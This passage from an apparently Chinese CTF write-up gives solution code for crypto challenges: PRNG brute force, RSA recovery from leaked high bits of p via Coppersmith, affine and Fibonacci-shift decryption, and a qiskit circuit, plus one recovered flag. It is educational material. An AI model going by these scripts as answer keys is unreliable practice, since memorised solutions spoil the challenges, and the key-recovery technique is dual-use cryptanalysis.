random.randint(<span class="number">0</span>, <span class="number">255</span>) == key_str[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">255</span>) == key_str[<span class="number">2</span>]:</span><br><span class="line">                    <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">255</span>) == key_str[<span class="number">3</span>]:</span><br><span class="line">                        <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">255</span>) == key_str[<span class="number">4</span>]:</span><br><span class="line">                            <span class="comment"># print(i)</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">    random.seed(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ci)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(ci[i] ^ random.randint(<span class="number">0</span>, <span class="number">255</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p>flag2使用<a href="https://github.com/sliedes/xor_factor%E5%88%86%E8%A7%A3%E5%8F%AF%E5%BE%97p%E3%80%81q%E3%80%82%E7%84%B6%E5%90%8E%E4%B8%BARSA%E8%A7%A3%E5%AF%86%E6%B5%81%E7%A8%8B%E3%80%82">https://github.com/sliedes/xor_factor分解可得p、q。然后为RSA解密流程。</a><br>flag3泄露p高比特，使⽤sage爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">phase3</span>(<span class="params">high_p, n</span>):</span><br><span class="line">   R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">   p = high_p + x</span><br><span class="line">   x0 = p.small_roots(X = <span class="number">2</span>^<span class="number">128</span>, beta = <span class="number">0.1</span>)[<span class="number">0</span>]</span><br><span class="line">   </span><br><span class="line">   P = <span class="built_in">int</span>(p(x0))</span><br><span class="line">   Q = n // P</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">assert</span> n == P*Q</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;P = &quot;</span>, P)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Q = &quot;</span>, Q)</span><br><span class="line">   </span><br><span class="line">   d = inverse_mod(<span class="number">65537</span>, (P-<span class="number">1</span>)*(Q-<span class="number">1</span>))</span><br><span class="line">   </span><br><span class="line">n = </span><br><span class="line"><span class="number">19611845515284359662247227180782154029099865864933830186692165788116252384024980174</span></span><br><span class="line"><span class="number">73615145822253832497538413583221968215685013928285421083320210181349076358369944751</span></span><br><span class="line"><span class="number">81423331528255192483979496104477684477996955046186481993760941924669084974192244526</span></span><br><span class="line"><span class="number">41187038667468266935808858291459629906505815855969713811506880442509946417170294700</span></span><br><span class="line"><span class="number">32160880511613766457813006156077785410519767924484133215530439161248901356301760068</span></span><br><span class="line"><span class="number">94098374697248742412324528671161472657454063671885455747912939097848134863072413289</span></span><br><span class="line"><span class="number">93821317365701875974313778396271741605711150401667698186661451787280291106456128869</span></span><br><span class="line"><span class="number">490333363854095115406461539484155281</span></span><br><span class="line">high_p = </span><br><span class="line"><span class="number">12486169997030204062244994885683576189016578219922865040910688519470496181374653275</span></span><br><span class="line"><span class="number">41707085905701844099285694575813137706637613849745987858675244587538853943003691255</span></span><br><span class="line"><span class="number">59144501770075324888609868206057317301995740969619175284309266906598553310708904405</span></span><br><span class="line"><span class="number">631582250925691470251725783174086755863681042731595837997056</span></span><br><span class="line">phase3(high_p, n)</span><br></pre></td></tr></table></figure><p>flag4为仿射密码，可暴力破解。亦可根据最后二字节确定仿射加密参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">e4</span>():</span><br><span class="line">    s4 = <span class="built_in">bytearray</span>.fromhex(c4)</span><br><span class="line">    int_a = s4[-<span class="number">1</span>]</span><br><span class="line">    int_b = s4[-<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(hex(int_a), hex(int_b))</span></span><br><span class="line">    CONST_A = <span class="built_in">ord</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    CONST_B = <span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    k = ((int_a - int_b) * gmpy2.invert((CONST_A - CONST_B), <span class="number">256</span>)) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(k)</span></span><br><span class="line">    b = (int_a - k * CONST_A) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(b)</span></span><br><span class="line">    <span class="comment"># 仿射密码解密</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s4:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((i-b)*gmpy2.invert(k, <span class="number">256</span>) % <span class="number">256</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="初识量子电路"><a href="#初识量子电路" class="headerlink" title="初识量子电路"></a>初识量子电路</h2><p>大致了解qiskit后，照图搭电路，然后模拟得到结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiskit <span class="keyword">import</span> *</span><br><span class="line"> <span class="keyword">from</span> qiskit.visualization <span class="keyword">import</span> plot_histogram</span><br><span class="line"> <span class="comment"># Use Aer&#x27;s qasm_simulator</span></span><br><span class="line"> simulator = Aer.get_backend(<span class="string">&#x27;qasm_simulator&#x27;</span>)</span><br><span class="line"> <span class="comment"># Create a Quantum Circuit acting on the q register</span></span><br><span class="line"> circuit = QuantumCircuit(<span class="number">36</span>, <span class="number">3</span>)</span><br><span class="line"> <span class="comment"># Add a H gate on qubit 0</span></span><br><span class="line"> circuit.x(<span class="number">0</span>)</span><br><span class="line"> circuit.x(<span class="number">1</span>)</span><br><span class="line"> circuit.i(<span class="number">2</span>)</span><br><span class="line"> circuit.x(<span class="number">3</span>)</span><br><span class="line"> circuit.x(<span class="number">4</span>)</span><br><span class="line"> circuit.x(<span class="number">5</span>)</span><br><span class="line"> circuit.i(<span class="number">6</span>)</span><br><span class="line"> circuit.x(<span class="number">7</span>)</span><br><span class="line"> circuit.x(<span class="number">8</span>)</span><br><span class="line"> circuit.x(<span class="number">9</span>)</span><br><span class="line"> circuit.i(<span class="number">10</span>)</span><br><span class="line"> circuit.x(<span class="number">11</span>)</span><br><span class="line"> circuit.i(<span class="number">12</span>)</span><br><span class="line"> circuit.x(<span class="number">13</span>)</span><br><span class="line"> circuit.i(<span class="number">14</span>)</span><br><span class="line"> circuit.i(<span class="number">15</span>)</span><br><span class="line"> circuit.x(<span class="number">16</span>)</span><br><span class="line"> circuit.i(<span class="number">17</span>)</span><br><span class="line"> circuit.x(<span class="number">18</span>)</span><br><span class="line"> circuit.i(<span class="number">19</span>)</span><br><span class="line"> <span class="keyword">for</span> xxx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    circuit.h(xxx)</span><br><span class="line"> <span class="comment"># Add a CX (CNOT) gate on control qubit 0 and target qubit 1</span></span><br><span class="line"> circuit.ccx(<span class="number">3</span>,<span class="number">7</span>,<span class="number">21</span>)</span><br><span class="line"> circuit.ccx(<span class="number">2</span>,<span class="number">6</span>,<span class="number">23</span>)</span><br><span class="line"> circuit.ccx(<span class="number">12</span>,<span class="number">13</span>,<span class="number">24</span>)</span><br><span class="line"> circuit.ccx(<span class="number">10</span>,<span class="number">11</span>,<span class="number">25</span>)</span><br><span class="line"> circuit.ccx(<span class="number">14</span>,<span class="number">15</span>,<span class="number">26</span>)</span><br><span class="line"> circuit.ccx(<span class="number">1</span>,<span class="number">5</span>,<span class="number">27</span>)</span><br><span class="line"> circuit.ccx(<span class="number">9</span>,<span class="number">10</span>,<span class="number">28</span>)</span><br><span class="line"> circuit.ccx(<span class="number">0</span>,<span class="number">4</span>,<span class="number">29</span>)</span><br><span class="line"> circuit.ccx(<span class="number">5</span>,<span class="number">11</span>,<span class="number">30</span>)</span><br><span class="line"> circuit.ccx(<span class="number">2</span>,<span class="number">8</span>,<span class="number">31</span>)</span><br><span class="line"> circuit.cx(<span class="number">21</span>,<span class="number">24</span>)</span><br><span class="line"> circuit.x(<span class="number">27</span>)</span><br><span class="line"> circuit.ccx(<span class="number">4</span>,<span class="number">30</span>,<span class="number">31</span>)</span><br><span class="line"> circuit.cx(<span class="number">24</span>,<span class="number">25</span>)</span><br><span class="line"> circuit.cx(<span class="number">27</span>,<span class="number">30</span>)</span><br><span class="line"> circuit.ccx(<span class="number">4</span>,<span class="number">11</span>,<span class="number">32</span>)</span><br><span class="line"> circuit.ccx(<span class="number">23</span>,<span class="number">24</span>,<span class="number">26</span>)</span><br><span class="line"> circuit.ccx(<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>)</span><br><span class="line"> circuit.ccx(<span class="number">30</span>,<span class="number">32</span>,<span class="number">34</span>)</span><br><span class="line"> circuit.cx(<span class="number">29</span>,<span class="number">31</span>)</span><br><span class="line"> circuit.cx(<span class="number">17</span>,<span class="number">34</span>)</span><br><span class="line"> circuit.cx(<span class="number">31</span>,<span class="number">33</span>)</span><br><span class="line"> circuit.ccx(<span class="number">18</span>,<span class="number">34</span>,<span class="number">35</span>)</span><br><span class="line"> circuit.x(<span class="number">33</span>)</span><br><span class="line"> circuit.measure(<span class="number">35</span>,<span class="number">2</span>)</span><br><span class="line"> circuit.ccx(<span class="number">34</span>,<span class="number">31</span>,<span class="number">20</span>)</span><br><span class="line"> <span class="comment"># Map the quantum measurement to the classical bits</span></span><br><span class="line"> circuit.measure(<span class="number">33</span>,<span class="number">0</span>)</span><br><span class="line"> circuit.measure(<span class="number">34</span>,<span class="number">1</span>)</span><br><span class="line"> <span class="comment"># qc_cir.measure_all()</span></span><br><span class="line"> <span class="comment"># Execute the circuit on the qasm simulator</span></span><br><span class="line"> re = simulator.run(circuit,shots=<span class="number">1000000</span>).result()</span><br><span class="line"> <span class="comment"># re = execute(qc_cir,simulator,shots=100).result()</span></span><br><span class="line"> <span class="comment"># Grab results from the job</span></span><br><span class="line"> <span class="comment"># Returns counts</span></span><br><span class="line"> counts = re.get_counts()</span><br><span class="line"> <span class="built_in">print</span>(counts)</span><br><span class="line"> <span class="built_in">print</span>(<span class="built_in">len</span>(counts))</span><br><span class="line"> circuit.draw(output=<span class="string">&#x27;mpl&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="兔子"><a href="#兔子" class="headerlink" title="兔子"></a>兔子</h2><p>因为密文都是字母，所以锁定移位&#x2F;替换密码大类，再根据提示所得斐波那契数列，想到根据数列每⼀位的值对密文每一位单独进行移位（仿射）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci_shift_decrypt</span>(<span class="params">encrypted_text, fib_list</span>):</span><br><span class="line">   decrypted_text = <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_text):</span><br><span class="line">       <span class="keyword">if</span> char.isalpha():  <span class="comment"># 只对字母字符进行解密</span></span><br><span class="line">           shift = fib_list[i]  <span class="comment"># 从预先计算的斐波那契数列表中获取偏移量</span></span><br><span class="line">           char_code = <span class="built_in">ord</span>(char)</span><br><span class="line">           offset = <span class="number">65</span> <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="number">97</span>  <span class="comment"># 大写字母和小写字母的ASCII码基点不同</span></span><br><span class="line">           <span class="comment"># 解密字符并添加到解密文本中</span></span><br><span class="line">           decrypted_char = <span class="built_in">chr</span>(((char_code - offset - shift) % <span class="number">26</span>) + offset)</span><br><span class="line">           decrypted_text += decrypted_char</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           decrypted_text += char  <span class="comment"># 非字母字符保持不变</span></span><br><span class="line">   <span class="keyword">return</span> decrypted_text</span><br><span class="line"><span class="comment"># 预先计算的斐波那契数列表</span></span><br><span class="line">fib_list = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">377</span>, <span class="number">610</span>, <span class="number">987</span>]</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">encrypted_text = <span class="string">&quot;hmcvxg_nsb_oabhd&quot;</span></span><br><span class="line">decrypted_text = fibonacci_shift_decrypt(encrypted_text, fib_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Text:&quot;</span>, decrypted_text)</span><br></pre></td></tr></table></figure><p>flag{glassy_sky_above}</p><h2 id="三重⻔"><a href="#三重⻔" class="headerlink" title="三重⻔"></a>三重⻔</h2><p>Ronald Rivest除了知名于RSA，还知名于RC系列，根据提示的密钥尝试出是RC4，获得Key和iv，在分组密码中尝试发现AES解密成功，最后得到一串英文字母序列，结合提供的a和b，联想到仿射密码，解密得到有意义的明文。</p><h2 id="放射！！！"><a href="#放射！！！" class="headerlink" title="放射！！！"></a>放射！！！</h2><p>给予的txt附件内容经过了仿射加密（x &#x3D; k1*y + k0 mod 26），因为仿射加密属于单表代换，所以可以分析其英文单词的出现频率，结合附件里的频率图，可以找到加密前后的英⽂字⺟对应关系，最终得到k1&#x3D;3，k0&#x3D;5，再用网上的在线仿射加密解密工具即可获得flag</p><p>这里给出加密与解密的C++源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 扩展的欧⼏⾥得算法求逆元，该函数还同时可以执⾏求gcd的功能</span></span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">exgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> d = <span class="built_in">exgcd</span>(b, a % b, y, x);</span><br><span class="line">y -= a / b * x;</span><br><span class="line"><span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 根据⽂件名读⼊相应的⽂件流，并转化为字符串，可以读⼊空格与换⾏符</span></span><br><span class="line"><span class="function">string <span class="title">f_open</span><span class="params">(string txt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ifstream fin;</span><br><span class="line">fin.<span class="built_in">open</span>(txt, ios::in);</span><br><span class="line">string s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">if</span> (!fin.<span class="built_in">is_open</span>() || !fin)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;打开⽂本失败！！&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">while</span> ((c = fin.<span class="built_in">get</span>()) != EOF)</span><br><span class="line">s += c;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">fin.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 仿射加密，加密参数可以⾃定</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(string s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> k1, k2;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输⼊仿射加密参数K1:：&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; k1;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exgcd</span>(<span class="number">26</span>, k1, x, y) != <span class="number">1</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;K1与26不互素，重新输⼊&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输⼊仿射加密参数K2：&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; k2;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">s[i] = ((s[i] - <span class="string">&#x27;a&#x27;</span>) * k1 + k2) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">s[i] = ((s[i] - <span class="string">&#x27;A&#x27;</span>) * k1 + k2) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ofstream fout;</span><br><span class="line">fout.<span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>);</span><br><span class="line">fout &lt;&lt; s;</span><br><span class="line">fout.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密，根据提供的参数进⾏解密</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decode</span><span class="params">(string s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> k1, k2;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输⼊仿射加密参数K1:：&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; k1;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exgcd</span>(<span class="number">26</span>, k1, x, y) != <span class="number">1</span>)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;K1与26不互素，重新输⼊&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">k1 = <span class="built_in">exgcd</span>(k1, <span class="number">26</span>, x, y);</span><br><span class="line">k1 = (x + <span class="number">26</span>) % <span class="number">26</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输⼊仿射加密参数K2：&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; k2;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">s[i] = (((s[i] - <span class="string">&#x27;a&#x27;</span> - k2 + <span class="number">26</span>) % <span class="number">26</span>) * k1) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">s[i] = (((s[i] - <span class="string">&#x27;A&#x27;</span> - k2 + <span class="number">26</span>) % <span class="number">26</span>) * k1) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// cout&lt;&lt;s&lt;&lt;endl;</span></span><br><span class="line">ofstream fout;</span><br><span class="line">fout.<span class="built_in">open</span>(<span class="string">&quot;de_res.txt&quot;</span>);</span><br><span class="line">fout &lt;&lt; s;</span><br><span class="line">fout.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对⽂本中单词出现频率进⾏频率分析</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">analys</span><span class="params">(string s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">double</span> num[<span class="number">26</span>], cnt = <span class="number">0</span>, res;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">num[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">num[s[i] - <span class="string">&#x27;a&#x27;</span>]++, cnt++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">num[s[i] - <span class="string">&#x27;A&#x27;</span>]++, cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">res = num[i] / cnt, cout &lt;&lt; <span class="built_in">char</span>(<span class="string">&#x27;a&#x27;</span> + i) &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> op;</span><br><span class="line">string txt;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;选择⼯作模式，输⼊1表示加密，输⼊2表示解密，输⼊3表示字⺟频率分析：&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; op;</span><br><span class="line"><span class="keyword">if</span> (op == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 从plaintext.txt读取⽂本进⾏加密</span></span><br><span class="line">txt = <span class="string">&quot;plaintext.txt&quot;</span>;</span><br><span class="line"><span class="built_in">encode</span>(<span class="built_in">f_open</span>(txt));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 从res.xtx读取⽂本进⾏解密</span></span><br><span class="line">txt = <span class="string">&quot;res.txt&quot;</span>;</span><br><span class="line"><span class="built_in">decode</span>(<span class="built_in">f_open</span>(txt));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 从res.txt读取⽂本进⾏分析</span></span><br><span class="line">txt = 